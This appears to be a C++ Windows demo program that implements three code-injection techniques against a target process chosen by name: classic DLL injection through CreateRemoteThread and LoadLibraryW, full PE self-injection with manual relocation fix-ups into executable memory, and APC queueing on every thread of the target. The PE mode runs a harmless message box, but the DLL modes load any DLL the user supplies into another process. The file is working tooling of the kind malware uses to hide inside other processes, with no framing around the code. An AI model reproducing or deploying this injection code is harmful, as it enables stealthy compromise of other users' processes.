// ConsoleApplication2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <atlconv.h>
#include <atlbase.h>
#include <tlhelp32.h>
#include "utils.h"
#include <vector>

using namespace std;


void evil_message_box() {
	MessageBox(NULL, TEXT("PE Injection!"), TEXT("PE Injection!"), MB_OK);
}

LPVOID write_path_to_victim(std::wstring dllName, DWORD pid) {
	TCHAR lpdllpath[MAX_PATH];
	auto retval = GetFullPathName(dllName.c_str(), MAX_PATH, lpdllpath, NULL);
	if (retval == 0) {
		cout << "GetFullpathName failed" << endl;
		return NULL;
	}

	auto victimHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

	cout << "opened victim process" << endl;
	// Allocate space for pathname in victim process
	auto pathsize = wcslen(lpdllpath) * sizeof(TCHAR);
	auto dllPathVictimPtr = VirtualAllocEx(victimHandle, NULL, pathsize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	cout << hex << "allocated victim mem at " << dllPathVictimPtr << endl;

	// Write pathname to victim process mem
	SIZE_T bytes_written;
	auto status = WriteProcessMemory(victimHandle, dllPathVictimPtr, lpdllpath, pathsize, &bytes_written);
	if (status == 0) {
		cout << "WriteProcessMemory failed" << endl;
		return NULL;
	}
	cout << "Wrote " << bytes_written << " byte pathname to victim" << endl;

	return dllPathVictimPtr;
}

void dll_path_injection(std::wstring dllName, std::wstring processName) {
	cout << "***** Classic DLL Injection *****" << endl;


	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	std::cout << "[-] Created process snapshot" << std::endl;

	auto targetPid = getProcessIdByName(hProcessSnap, processName);
	if (targetPid == -1) {
		return;
	}

	auto victimHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, targetPid);
	cout << "opened victim process" << endl;
	
	auto dllPathVictimPtr = write_path_to_victim(dllName, targetPid);
	if (!dllPathVictimPtr) {
		return;
	}

	// Get address of kernel32 LoadLibrary function
	auto LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW");
	cout << "Got kernel32 LoadLibraryW address " << hex << LoadLibraryAddress << endl;

	// Tell victimThread to run LoadLibrary 
	auto threadId = CreateRemoteThread(victimHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryAddress), 
		dllPathVictimPtr, NULL, nullptr);
	if (threadId == NULL) {
		print_error(L"CreateRemoteThread failed: %s\n");
	}

	cout << "Waiting for thread " << threadId << endl;
	WaitForSingleObject(threadId, INFINITE);
	cout << "Thread finished" << endl;

	CloseHandle(victimHandle);
	printf("[+] Closed process handle");
}	


void pe_injection(std::wstring processName) {
	cout << "***** PE Injection ******" << endl;
	// This time, write entire PE into mem. Trickiest part is fixing up the relocations...
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	std::cout << "[-] Created process snapshot" << std::endl;

	auto targetpid = getProcessIdByName(hProcessSnap, processName);
	if (targetpid == -1) {
		return;
	}

	// Open target process
	HANDLE hTargetProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, targetpid);

	cout << "Opened target process" << endl;

	auto hThisMod = GetModuleHandle(NULL);
	cout << hex << "This mod " << hThisMod << endl;
	PIMAGE_NT_HEADERS pe_header = (PIMAGE_NT_HEADERS)((LPBYTE)hThisMod + ((PIMAGE_DOS_HEADER)hThisMod)->e_lfanew);

	/* Get the size of the code we want to inject */
	DWORD moduleSize = pe_header->OptionalHeader.SizeOfImage;

	// Get address in target process that we are gonna write this PE to
	LPVOID targetMemBuf = VirtualAllocEx(hTargetProc, NULL, moduleSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (targetMemBuf == NULL) {
		print_error(L"VirtualAllocEx");
	}

	printf("Target membuf %x\n", (uint32_t)targetMemBuf);

	// Load this exe into memory so we can fix it up 
	LPBYTE curMemBuf = (LPBYTE)VirtualAlloc(NULL, moduleSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy our process into curMemBuf
	memcpy(curMemBuf, hThisMod, moduleSize);
	printf("Copied PE into curMemBuf: %x\n", (uint32_t)curMemBuf);
	
	// Get address of reloc section from data directory
	auto datadir_reloc_entry = &pe_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// iterate relocations and fix them up 
	if (datadir_reloc_entry->Size > 0 && datadir_reloc_entry->VirtualAddress > 0) {

		PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(curMemBuf + datadir_reloc_entry->VirtualAddress);

		// Loop through all relocation blocks

		while (reloc->VirtualAddress > 0) {
			printf("Working on reloc %x\n", reloc);
			// Loop through all entries in this block
			int numRelocEntriesInBlock = (reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION)) / 2;

			LPWORD relocFixupTable = (LPWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
			for (int entryidx = 0; entryidx < numRelocEntriesInBlock; entryidx++) {
				 auto fixupOffset = relocFixupTable[entryidx] & 0xfff;

				 // fix the fixupAddr
				DWORD* relocPtr = (DWORD*)(curMemBuf + reloc->VirtualAddress + fixupOffset);
				*relocPtr = (*relocPtr) - (DWORD)hThisMod + (DWORD)targetMemBuf;
			}

			// Go on to next block
			reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
		}
	}

	cout << "Fixed up PE" << endl;
	// Write fixed-up PE into target process mem
	auto retval = WriteProcessMemory(hTargetProc, targetMemBuf, curMemBuf, moduleSize, NULL);
	if (!retval) {
		cout << "Writing fixed-up PE to target failed" << endl;
		return;
	}
	cout << "Wrote fixed-up PE to target" << endl;

	LPTHREAD_START_ROUTINE targetFunc = (LPTHREAD_START_ROUTINE)((LPBYTE)targetMemBuf + (DWORD)((LPBYTE)evil_message_box - (LPBYTE)hThisMod));

	// Now, start evil thread!
	auto threadId = CreateRemoteThread(hTargetProc, nullptr, 0, targetFunc, 
		NULL, NULL, nullptr);

	if (threadId == NULL) {
		print_error(L"CreateRemoteThread failed");
	}

	cout << "Waiting for thread " << threadId << endl;
	WaitForSingleObject(threadId, INFINITE);
	cout << "Thread finished" << endl;
}


//void process_replacing(std::wstring dllPath, std::wstring processName) {
//	// This one is probably the most complex of the basic techniques, involves parsing and writing an entire PE 
//
//}

void apc_hooking(std::wstring dllName, std::wstring processName) {
	cout << "**** APC Hooking ****" << endl;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	std::cout << "[-] Created process snapshot" << std::endl;

	auto targetPid = getProcessIdByName(hProcessSnap, processName);
	if (targetPid == -1) {
		return;
	}
	
	// Write DLL path to target mem, same as DLL injection
	auto dllPathVictimPtr = write_path_to_victim(dllName, targetPid);
	if (!dllPathVictimPtr) {
		return;
	}

	// Now, get list of threads owned by above PID
	vector<DWORD> tids;
	getTidsByPid(hProcessSnap, targetPid, tids);

	// Hook every thread!
	for (auto tid : tids) {
		printf("Hooking thread %d\n", tid);
		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);

		if (hThread) {
			QueueUserAPC(
				(PAPCFUNC)GetProcAddress(
					GetModuleHandle(L"kernel32"),
					"LoadLibraryW"),
				hThread,
				(ULONG_PTR)dllPathVictimPtr);
		}
	}
}


int main(int argc, char* argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);
	USES_CONVERSION;

	if (argc < 3) {
		printf("Not enough arguments\n");
		exit(0);
	}

	char* mode = argv[1];
	char* dllPath =  argv[2];
	char* processName =  argv[3];
	
	if (strncmp(mode, "dll_inj", 7) == 0) {
		dll_path_injection(A2T(dllPath), A2T(processName));
	}
	else if (strncmp(mode, "pe_inj", 6) == 0) {
		pe_injection(A2T(processName));
	}
	else if (strncmp(mode, "apc", 3) == 0) {
		apc_hooking(A2T(dllPath), A2T(processName));
	}
}
